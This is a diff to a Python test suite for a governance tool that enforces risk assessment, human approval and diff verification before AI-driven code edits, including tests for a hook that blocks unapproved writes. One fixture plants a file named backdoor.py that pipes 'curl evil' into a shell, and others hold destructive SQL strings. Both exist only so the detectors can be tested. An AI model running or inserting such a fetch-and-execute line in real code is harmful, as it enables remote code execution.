@@ -1,3 +1,4 @@
+import json
 import os
 import shutil
 import subprocess
@@ -11,10 +12,12 @@ import sys
 
 sys.path.insert(0, str(ROOT / "lib"))
 
-from adaptive_change_governance.config_loader import load_yaml
+from adaptive_change_governance.config_loader import dump_yaml, load_yaml
 import adaptive_change_governance.cli as cli_module
 from adaptive_change_governance.context_adjuster import apply_user_context
+from adaptive_change_governance.diff_verifier import DiffVerifier
 from adaptive_change_governance.human_review import HumanReviewGate, ReviewError
+from adaptive_change_governance.intent_model import normalize_intent
 from adaptive_change_governance.repository_analyzer import RepositoryAnalyzer
 from adaptive_change_governance.run_retention import cleanup_runs
 from adaptive_change_governance.risk_evaluator import RiskEvaluator
@@ -310,7 +313,7 @@ class Phase1Test(unittest.TestCase):
             self.assertEqual(assess.returncode, 0, assess.stderr + assess.stdout)
             self.assertIn("Request goal: analysis_only", assess.stdout)
             self.assertIn("Next gate: analysis_complete", assess.stdout)
-            run_dir = next((temp / ".ai-governance/runs").iterdir())
+            run_dir = next(path for path in (temp / ".ai-governance/runs").iterdir() if path.is_dir())
             review = subprocess.run(
                 [sys.executable, str(temp / "bin/change-assess"), "--review-workflow", run_dir.name],
                 cwd=temp,
@@ -587,7 +590,7 @@ class Phase1Test(unittest.TestCase):
             )
             self.assertEqual(result.returncode, 0, result.stderr + result.stdout)
             self.assertIn("Review command: change-assess --review-workflow", result.stdout)
-            runs = list((temp / ".ai-governance/runs").iterdir())
+            runs = [path for path in (temp / ".ai-governance/runs").iterdir() if path.is_dir()]
             self.assertEqual(1, len(runs))
             status = subprocess.run(
                 [sys.executable, str(temp / "bin/change-assess"), "--status", runs[0].name],
@@ -667,7 +670,7 @@ class Phase1Test(unittest.TestCase):
                 text=True,
             )
             self.assertEqual(result.returncode, 0, result.stderr + result.stdout)
-            run_dir = next((temp / ".ai-governance/runs").iterdir())
+            run_dir = next(path for path in (temp / ".ai-governance/runs").iterdir() if path.is_dir())
             review = load_yaml(run_dir / "human-review.yaml")
             review["decision"] = "approve"
             review["module_changes"]["add_required"] = ["requirement_confirmation"]
@@ -719,7 +722,7 @@ class Phase1Test(unittest.TestCase):
                 text=True,
             )
             self.assertEqual(assess.returncode, 0, assess.stderr + assess.stdout)
-            run_dir = next((temp / ".ai-governance/runs").iterdir())
+            run_dir = next(path for path in (temp / ".ai-governance/runs").iterdir() if path.is_dir())
 
             blocked_plan = subprocess.run(
                 [sys.executable, str(temp / "bin/change-assess"), "--propose-technical-plan", run_dir.name],
@@ -831,7 +834,7 @@ class Phase1Test(unittest.TestCase):
                 text=True,
             )
             self.assertEqual(assess.returncode, 0, assess.stderr + assess.stdout)
-            run_dir = next((temp / ".ai-governance/runs").iterdir())
+            run_dir = next(path for path in (temp / ".ai-governance/runs").iterdir() if path.is_dir())
             approval = subprocess.run(
                 [sys.executable, str(temp / "bin/change-assess"), "--approve-workflow", run_dir.name],
                 cwd=temp,
@@ -1002,9 +1005,6 @@ class Phase1Test(unittest.TestCase):
     def test_diff_verification_blocks_executable_change_for_comment_only_intent(self):
         temp = Path(tempfile.mkdtemp())
         try:
-            shutil.copytree(ROOT / ".ai-governance", temp / ".ai-governance", ignore=shutil.ignore_patterns("runs"))
-            shutil.copytree(ROOT / "lib", temp / "lib")
-            shutil.copytree(ROOT / "bin", temp / "bin")
             (temp / "app").mkdir()
             database = temp / "app/database.py"
             database.write_text("# old comment\nDATABASE_NAME = 'main'\n", encoding="utf-8")
@@ -1044,9 +1044,10 @@ class Phase1Test(unittest.TestCase):
                 text=True,
             )
             env = os.environ.copy()
-            env["PYTHONPATH"] = str(temp / "lib")
+            env["PYTHONPATH"] = str(ROOT / "lib")
+            env["ACG_TOOL_ROOT"] = str(ROOT)
             assess = subprocess.run(
-                [sys.executable, str(temp / "bin/change-assess"), "修改 app/database.py 中的一行注释", "--intent-file", str(intent_path)],
+                [sys.executable, str(ROOT / "bin/change-assess"), "修改 app/database.py 中的一行注释", "--intent-file", str(intent_path)],
                 cwd=temp,
                 env=env,
                 check=False,
@@ -1054,18 +1055,18 @@ class Phase1Test(unittest.TestCase):
                 text=True,
             )
             self.assertEqual(assess.returncode, 0, assess.stderr + assess.stdout)
-            run_dir = next((temp / ".ai-governance/runs").iterdir())
+            run_dir = next(path for path in (temp / ".ai-governance/runs").iterdir() if path.is_dir())
             for command in (
-                [sys.executable, str(temp / "bin/change-assess"), "--approve-workflow", run_dir.name],
-                [sys.executable, str(temp / "bin/change-assess"), "--propose-technical-plan", run_dir.name],
-                [sys.executable, str(temp / "bin/change-assess"), "--approve-technical-plan", run_dir.name],
+                [sys.executable, str(ROOT / "bin/change-assess"), "--approve-workflow", run_dir.name],
+                [sys.executable, str(ROOT / "bin/change-assess"), "--propose-technical-plan", run_dir.name],
+                [sys.executable, str(ROOT / "bin/change-assess"), "--approve-technical-plan", run_dir.name],
             ):
                 result = subprocess.run(command, cwd=temp, env=env, check=False, capture_output=True, text=True)
                 self.assertEqual(result.returncode, 0, result.stderr + result.stdout)
 
             database.write_text("# new comment\nDATABASE_NAME = 'main'\n", encoding="utf-8")
             pass_result = subprocess.run(
-                [sys.executable, str(temp / "bin/change-assess"), "--verify-diff", run_dir.name],
+                [sys.executable, str(ROOT / "bin/change-assess"), "--verify-diff", run_dir.name],
                 cwd=temp,
                 env=env,
                 check=False,
@@ -1078,7 +1079,7 @@ class Phase1Test(unittest.TestCase):
             approved_required = load_yaml(run_dir / "approved-workflow.yaml")["workflow_recommendation"]["required_modules"]
             for module in approved_required:
                 completed_module = subprocess.run(
-                    [sys.executable, str(temp / "bin/change-assess"), "--complete-step", run_dir.name, "--module", module],
+                    [sys.executable, str(ROOT / "bin/change-assess"), "--complete-step", run_dir.name, "--module", module],
                     cwd=temp,
                     env=env,
                     check=False,
@@ -1087,7 +1088,7 @@ class Phase1Test(unittest.TestCase):
                 )
                 self.assertEqual(completed_module.returncode, 0, completed_module.stderr + completed_module.stdout)
             reassess = subprocess.run(
-                [sys.executable, str(temp / "bin/change-assess"), "--reassess", run_dir.name],
+                [sys.executable, str(ROOT / "bin/change-assess"), "--reassess", run_dir.name],
                 cwd=temp,
                 env=env,
                 check=False,
@@ -1101,7 +1102,7 @@ class Phase1Test(unittest.TestCase):
             self.assertTrue((run_dir / "reassessment.yaml").exists())
             self.assertIn("Requires human reapproval: False", reassess.stdout)
             verification = subprocess.run(
-                [sys.executable, str(temp / "bin/change-assess"), "--generate-verification-report", run_dir.name],
+                [sys.executable, str(ROOT / "bin/change-assess"), "--generate-verification-report", run_dir.name],
                 cwd=temp,
                 env=env,
                 check=False,
@@ -1116,7 +1117,7 @@ class Phase1Test(unittest.TestCase):
 
             database.write_text("# new comment\nDATABASE_NAME = 'other'\n", encoding="utf-8")
             blocked = subprocess.run(
-                [sys.executable, str(temp / "bin/change-assess"), "--verify-diff", run_dir.name],
+                [sys.executable, str(ROOT / "bin/change-assess"), "--verify-diff", run_dir.name],
                 cwd=temp,
                 env=env,
                 check=False,
@@ -1126,7 +1127,7 @@ class Phase1Test(unittest.TestCase):
             self.assertEqual(blocked.returncode, 3, blocked.stderr + blocked.stdout)
             self.assertIn("low-risk intent diff includes executable-looking changes", blocked.stdout)
             gate = subprocess.run(
-                [sys.executable, str(temp / "bin/change-assess"), "--check-gate", run_dir.name, "--stage", "implementation"],
+                [sys.executable, str(ROOT / "bin/change-assess"), "--check-gate", run_dir.name, "--stage", "implementation"],
                 cwd=temp,
                 env=env,
                 check=False,
@@ -1156,7 +1157,7 @@ class Phase1Test(unittest.TestCase):
                 text=True,
             )
             self.assertEqual(result.returncode, 0, result.stderr + result.stdout)
-            run_dir = next((temp / ".ai-governance/runs").iterdir())
+            run_dir = next(path for path in (temp / ".ai-governance/runs").iterdir() if path.is_dir())
             review = subprocess.run(
                 [sys.executable, str(temp / "bin/change-assess"), "--review-workflow", run_dir.name],
                 cwd=temp,
@@ -1196,7 +1197,7 @@ class Phase1Test(unittest.TestCase):
                 text=True,
             )
             self.assertEqual(result.returncode, 0, result.stderr + result.stdout)
-            run_dir = next((temp / ".ai-governance/runs").iterdir())
+            run_dir = next(path for path in (temp / ".ai-governance/runs").iterdir() if path.is_dir())
             review = subprocess.run(
                 [sys.executable, str(temp / "bin/change-assess"), "--review-workflow", run_dir.name],
                 cwd=temp,
@@ -1307,6 +1308,379 @@ class Phase1Test(unittest.TestCase):
                 yaml.safe_dump(review, handle, sort_keys=False, allow_unicode=True)
             with self.assertRaisesRegex(ReviewError, "cannot remove"):
                 gate.approve_workflow(temp, self.project_risk)
+        finally:
+            shutil.rmtree(temp)
+
+
+class VerificationGapTest(unittest.TestCase):
+    """Regression tests for verification-layer bypasses found in the 2026-07 audit."""
+
+    def setUp(self):
+        self.project_risk = load_yaml(ROOT / ".ai-governance/project-risk.yaml")
+        self.guardrails = load_yaml(ROOT / ".ai-governance/guardrails.yaml")
+        self.modules = load_yaml(ROOT / ".ai-governance/workflow-modules.yaml")
+
+    def _git(self, temp: Path, *args: str) -> None:
+        subprocess.run(
+            ["git", "-c", "user.name=Test", "-c", "user.email=test@example.com", *args],
+            cwd=temp,
+            check=True,
+            capture_output=True,
+            text=True,
+        )
+
+    def _diff_run(self, temp: Path, allowed: list[str], change_nature: str = "display_text_only") -> Path:
+        run_dir = temp / ".ai-governance/runs/testrun"
+        run_dir.mkdir(parents=True)
+        dump_yaml(run_dir / "evidence-pack.yaml", {
+            "version": 1,
+            "request": {"original": "test", "model_intent": {"change_nature": change_nature}},
+            "code_findings": {"file_risk": {"risk_adjustment": "lowered_by_change_nature"}},
+        })
+        dump_yaml(run_dir / "approved-technical-plan.yaml", {
+            "implementation_plan": {"files_to_modify": [{"path": path} for path in allowed]},
+        })
+        return run_dir
+
+    def test_diff_verification_sees_staged_executable_change(self):
+        temp = Path(tempfile.mkdtemp())
+        try:
+            (temp / "app").mkdir()
+            (temp / "app/menu.py").write_text("MENU_LABEL = '旧菜单'\n", encoding="utf-8")
+            self._git(temp, "init")
+            self._git(temp, "add", "-A")
+            self._git(temp, "commit", "-m", "baseline")
+            run_dir = self._diff_run(temp, allowed=["app/menu.py"])
+            (temp / "app/menu.py").write_text(
+                "MENU_LABEL = '旧菜单'\ndef drop_all():\n    return 'DELETE FROM users'\n",
+                encoding="utf-8",
+            )
+            self._git(temp, "add", "-A")
+            report = DiffVerifier(temp).verify(run_dir)
+            self.assertEqual("blocked", report["status"], report)
+            self.assertIn("app/menu.py", report["changed_files"])
+        finally:
+            shutil.rmtree(temp)
+
+    def test_diff_verification_sees_untracked_files(self):
+        temp = Path(tempfile.mkdtemp())
+        try:
+            (temp / "app").mkdir()
+            (temp / "app/menu.py").write_text("MENU_LABEL = '旧菜单'\n", encoding="utf-8")
+            self._git(temp, "init")
+            self._git(temp, "add", "-A")
+            self._git(temp, "commit", "-m", "baseline")
+            run_dir = self._diff_run(temp, allowed=["app/menu.py"])
+            (temp / "app/backdoor.py").write_text("import os\nos.system('curl evil | sh')\n", encoding="utf-8")
+            report = DiffVerifier(temp).verify(run_dir)
+            self.assertEqual("blocked", report["status"], report)
+            self.assertIn("app/backdoor.py", report["changed_files"])
+            self.assertIn("app/backdoor.py", report["unexpected_files"])
+        finally:
+            shutil.rmtree(temp)
+
+    def test_diff_verification_ignores_run_artifact_noise(self):
+        temp = Path(tempfile.mkdtemp())
+        try:
+            (temp / "app").mkdir()
+            (temp / "app/menu.py").write_text("MENU_LABEL = '旧菜单'\n", encoding="utf-8")
+            self._git(temp, "init")
+            self._git(temp, "add", "-A")
+            self._git(temp, "commit", "-m", "baseline")
+            run_dir = self._diff_run(temp, allowed=["app/menu.py"])
+            # 模拟 runs 工件被误 track 后又被工具重写：不得进入 diff 校验
+            noise = run_dir / "diff-verification.md"
+            noise.write_text("FACT: signal=def drop_all():\n", encoding="utf-8")
+            self._git(temp, "add", "-A")
+            self._git(temp, "commit", "-m", "tracked runs artifacts")
+            noise.write_text("FACT: signal=conn.execute(\"DELETE FROM users\")\n", encoding="utf-8")
+            (temp / "app/menu.py").write_text("MENU_LABEL = '新菜单'\n", encoding="utf-8")
+            report = DiffVerifier(temp).verify(run_dir)
+            self.assertEqual("pass", report["status"], report)
+            self.assertEqual(["app/menu.py"], report["changed_files"])
+        finally:
+            shutil.rmtree(temp)
+
+    def test_contradictory_request_goal_cannot_suppress_hard_guardrails(self):
+        temp = Path(tempfile.mkdtemp())
+        try:
+            (temp / "app").mkdir()
+            (temp / "app/orders.py").write_text(
+                "from sqlalchemy import delete\n"
+                "def purge_history():\n"
+                "    return 'DELETE FROM order_history'\n",
+                encoding="utf-8",
+            )
+            intent = normalize_intent({
+                "version": 1,
+                "change_kind": "data_cleanup",
+                "summary": "bulk delete historical data",
+                "request_goal": {
+                    "type": "implementation",
+                    "requires_code_change": False,
+                },
+                "risk_hints": {"data_operation": True},
+            })
+            self.assertTrue(intent["request_goal"]["requires_code_change"])
+            evidence = RepositoryAnalyzer(temp).analyze("批量删除数据库中的历史订单数据记录", self.project_risk, intent=intent)
+            risk = RiskEvaluator(self.project_risk, self.guardrails).evaluate(evidence)
+            self.assertIn("destructive-database-operation", risk["triggered_guardrails"])
+            self.assertEqual("L4", risk["final_level"])
+        finally:
+            shutil.rmtree(temp)
+
+    def test_technical_plan_approval_blocks_unfinished_guardrail_analysis(self):
+        temp = Path(tempfile.mkdtemp())
+        try:
+            (temp / "app").mkdir()
+            (temp / "app/billing.py").write_text(
+                "def refund_amount(total):\n    return round(total * 0.98, 2)\n",
+                encoding="utf-8",
+            )
+            env = os.environ.copy()
+            env["PYTHONPATH"] = str(ROOT / "lib")
+            env["ACG_TOOL_ROOT"] = str(ROOT)
+
+            def run_cli(*cli_args):
+                return subprocess.run(
+                    [sys.executable, str(ROOT / "bin/change-assess"), *cli_args],
+                    cwd=temp,
+                    env=env,
+                    check=False,
+                    capture_output=True,
+                    text=True,
+                )
+
+            assess = run_cli("调整退款金额保留两位小数的计算方式")
+            self.assertEqual(assess.returncode, 0, assess.stderr + assess.stdout)
+            run_dir = next(path for path in (temp / ".ai-governance/runs").iterdir() if path.is_dir())
+            risk = load_yaml(run_dir / "risk-assessment.yaml")
+            self.assertIn("business_rule_confirmation", risk["required_by_guardrails"])
+
+            self.assertEqual(0, run_cli("--approve-workflow", run_dir.name).returncode)
+            proposed = run_cli("--propose-technical-plan", run_dir.name)
+            self.assertEqual(0, proposed.returncode, proposed.stderr + proposed.stdout)
+            plan = load_yaml(run_dir / "technical-plan.yaml")
+            self.assertEqual("planned", plan["module_coverage"]["business_rule_confirmation"]["status"])
+
+            blocked = run_cli("--approve-technical-plan", run_dir.name)
+            self.assertEqual(3, blocked.returncode, blocked.stderr + blocked.stdout)
+            self.assertIn("business_rule_confirmation is not completed", blocked.stdout)
+
+            completed = run_cli("--complete-step", run_dir.name, "--module", "business_rule_confirmation")
+            self.assertEqual(0, completed.returncode, completed.stderr + completed.stdout)
+            approved = run_cli("--approve-technical-plan", run_dir.name)
+            self.assertEqual(0, approved.returncode, approved.stderr + approved.stdout)
+        finally:
+            shutil.rmtree(temp)
+
+    def test_assess_writes_runs_gitignore_by_default(self):
+        temp = Path(tempfile.mkdtemp())
+        try:
+            (temp / "app").mkdir()
+            (temp / "app/menu.py").write_text("MENU_LABEL = '旧菜单'\n", encoding="utf-8")
+            env = os.environ.copy()
+            env["PYTHONPATH"] = str(ROOT / "lib")
+            env["ACG_TOOL_ROOT"] = str(ROOT)
+            result = subprocess.run(
+                [sys.executable, str(ROOT / "bin/change-assess"), "修改菜单显示文案"],
+                cwd=temp,
+                env=env,
+                check=False,
+                capture_output=True,
+                text=True,
+            )
+            self.assertEqual(result.returncode, 0, result.stderr + result.stdout)
+            gitignore = temp / ".ai-governance/runs/.gitignore"
+            self.assertTrue(gitignore.exists())
+            self.assertEqual("*\n", gitignore.read_text(encoding="utf-8"))
+        finally:
+            shutil.rmtree(temp)
+
+    def test_planning_only_goal_keeps_hard_guardrails(self):
+        temp = Path(tempfile.mkdtemp())
+        try:
+            (temp / "app").mkdir()
+            (temp / "app/orders.py").write_text(
+                "from sqlalchemy import delete\n"
+                "def purge_history():\n"
+                "    return 'DELETE FROM order_history'\n",
+                encoding="utf-8",
+            )
+            intent = normalize_intent({
+                "version": 1,
+                "change_kind": "technical_plan",
+                "summary": "plan a bulk delete of historical data",
+                "request_goal": {"type": "planning_only"},
+                "risk_hints": {"data_operation": True},
+            })
+            evidence = RepositoryAnalyzer(temp).analyze("为批量删除数据库历史订单数据制定方案", self.project_risk, intent=intent)
+            risk = RiskEvaluator(self.project_risk, self.guardrails).evaluate(evidence)
+            self.assertIn("destructive-database-operation", risk["triggered_guardrails"])
+        finally:
+            shutil.rmtree(temp)
+
+    def test_diff_verification_sees_deleted_and_renamed_files(self):
+        temp = Path(tempfile.mkdtemp())
+        try:
+            (temp / "app").mkdir()
+            (temp / "app/menu.py").write_text("MENU_LABEL = '旧菜单'\n", encoding="utf-8")
+            (temp / "app/auth.py").write_text("PERMISSIONS = ['admin']\n", encoding="utf-8")
+            self._git(temp, "init")
+            self._git(temp, "add", "-A")
+            self._git(temp, "commit", "-m", "baseline")
+            run_dir = self._diff_run(temp, allowed=["app/menu.py"])
+            self._git(temp, "rm", "-q", "app/auth.py")
+            self._git(temp, "mv", "app/menu.py", "app/renamed.py")
+            report = DiffVerifier(temp).verify(run_dir)
+            self.assertEqual("blocked", report["status"], report)
+            self.assertIn("app/auth.py", report["changed_files"])
+            self.assertIn("app/renamed.py", report["changed_files"])
+            self.assertIn("app/auth.py", report["unexpected_files"])
+        finally:
+            shutil.rmtree(temp)
+
+
+class PluginSyncTest(unittest.TestCase):
+    """The plugin package must ship the same runtime as the root tree.
+
+    On drift, run scripts/sync-plugin.sh and commit both copies.
+    """
+
+    PLUGIN = ROOT / "plugins/adaptive-change-governance"
+
+    def _tree(self, base: Path) -> dict[str, bytes]:
+        return {
+            str(path.relative_to(base)): path.read_bytes()
+            for path in sorted(base.rglob("*"))
+            if path.is_file() and "__pycache__" not in path.parts
+        }
+
+    def test_plugin_lib_matches_root_lib(self):
+        self.assertEqual(self._tree(ROOT / "lib"), self._tree(self.PLUGIN / "lib"))
+
+    def test_plugin_bin_matches_root_bin(self):
+        self.assertEqual(
+            (ROOT / "bin/change-assess").read_bytes(),
+            (self.PLUGIN / "bin/change-assess").read_bytes(),
+        )
+
+    def test_plugin_governance_configs_match_root(self):
+        for name in ("assessment-schema", "workflow-modules", "artifact-schemas", "project-risk", "guardrails"):
+            with self.subTest(config=name):
+                self.assertEqual(
+                    (ROOT / f".ai-governance/{name}.yaml").read_bytes(),
+                    (self.PLUGIN / f".ai-governance/{name}.yaml").read_bytes(),
+                )
+
+    def test_plugin_profiles_match_root(self):
+        self.assertEqual(
+            self._tree(ROOT / ".ai-governance/profiles"),
+            self._tree(self.PLUGIN / ".ai-governance/profiles"),
+        )
+
+
+class HookGateTest(unittest.TestCase):
+    """Tests for the plugin PreToolUse implementation-gate hook."""
+
+    HOOK = ROOT / "plugins/adaptive-change-governance/hooks/implementation_gate.py"
+
+    def _invoke(self, cwd: Path, file_path: str, mode: str | None = None) -> dict:
+        env = os.environ.copy()
+        env.pop("ACG_HOOK_MODE", None)
+        if mode:
+            env["ACG_HOOK_MODE"] = mode
+        payload = {"tool_name": "Write", "tool_input": {"file_path": file_path}, "cwd": str(cwd)}
+        result = subprocess.run(
+            [sys.executable, str(self.HOOK)],
+            input=json.dumps(payload),
+            env=env,
+            check=False,
+            capture_output=True,
+            text=True,
+        )
+        self.assertEqual(0, result.returncode, result.stderr)
+        return json.loads(result.stdout) if result.stdout.strip() else {}
+
+    def _make_run(self, temp: Path, goal_type: str = "implementation") -> Path:
+        run_dir = temp / ".ai-governance/runs/20260714-000000-test"
+        run_dir.mkdir(parents=True)
+        dump_yaml(run_dir / "workflow-recommendation.yaml", {
+            "version": 1,
+            "workflow_recommendation": {
+                "request_goal": {"type": goal_type, "requires_code_change": goal_type == "implementation"},
+                "final_level": "L2",
+            },
+        })
+        return run_dir
+
+    def _decision(self, output: dict) -> str:
+        return output.get("hookSpecificOutput", {}).get("permissionDecision", "allow")
+
+    def test_hook_allows_projects_without_governance_runs(self):
+        temp = Path(tempfile.mkdtemp())
+        try:
+            self.assertEqual({}, self._invoke(temp, str(temp / "app/main.py")))
+        finally:
+            shutil.rmtree(temp)
+
+    def test_hook_blocks_edit_before_implementation_gate(self):
+        temp = Path(tempfile.mkdtemp())
+        try:
+            self._make_run(temp)
+            output = self._invoke(temp, str(temp / "app/main.py"))
+            self.assertEqual("deny", self._decision(output))
+            self.assertIn("implementation gate", output["hookSpecificOutput"]["permissionDecisionReason"])
+        finally:
+            shutil.rmtree(temp)
+
+    def test_hook_allows_edit_after_gate_passes(self):
+        temp = Path(tempfile.mkdtemp())
+        try:
+            run_dir = self._make_run(temp)
+            (run_dir / ".workflow-approved").write_text("t\n", encoding="utf-8")
+            (run_dir / ".technical-plan-approved").write_text("t\n", encoding="utf-8")
+            dump_yaml(run_dir / "approved-technical-plan.yaml", {"version": 1})
+            self.assertEqual({}, self._invoke(temp, str(temp / "app/main.py")))
+        finally:
+            shutil.rmtree(temp)
+
+    def test_hook_blocks_edit_when_diff_verification_blocked(self):
+        temp = Path(tempfile.mkdtemp())
+        try:
+            run_dir = self._make_run(temp)
+            (run_dir / ".workflow-approved").write_text("t\n", encoding="utf-8")
+            (run_dir / ".technical-plan-approved").write_text("t\n", encoding="utf-8")
+            dump_yaml(run_dir / "approved-technical-plan.yaml", {"version": 1})
+            dump_yaml(run_dir / "diff-verification.yaml", {"version": 1, "status": "blocked"})
+            output = self._invoke(temp, str(temp / "app/main.py"))
+            self.assertEqual("deny", self._decision(output))
+        finally:
+            shutil.rmtree(temp)
+
+    def test_hook_protects_gate_state_files_from_direct_writes(self):
+        temp = Path(tempfile.mkdtemp())
+        try:
+            run_dir = self._make_run(temp)
+            output = self._invoke(temp, str(run_dir / ".workflow-approved"))
+            self.assertEqual("deny", self._decision(output))
+            self.assertIn("change-assess CLI", output["hookSpecificOutput"]["permissionDecisionReason"])
+        finally:
+            shutil.rmtree(temp)
+
+    def test_hook_ignores_analysis_only_runs_and_respects_off_mode(self):
+        temp = Path(tempfile.mkdtemp())
+        try:
+            self._make_run(temp, goal_type="analysis_only")
+            self.assertEqual({}, self._invoke(temp, str(temp / "app/main.py")))
+            run_dir = temp / ".ai-governance/runs/20260714-000001-impl"
+            run_dir.mkdir(parents=True)
+            dump_yaml(run_dir / "workflow-recommendation.yaml", {
+                "version": 1,
+                "workflow_recommendation": {"request_goal": {"type": "implementation"}},
+            })
+            self.assertEqual("deny", self._decision(self._invoke(temp, str(temp / "app/main.py"))))
+            self.assertEqual({}, self._invoke(temp, str(temp / "app/main.py"), mode="off"))
         finally:
             shutil.rmtree(temp)
 
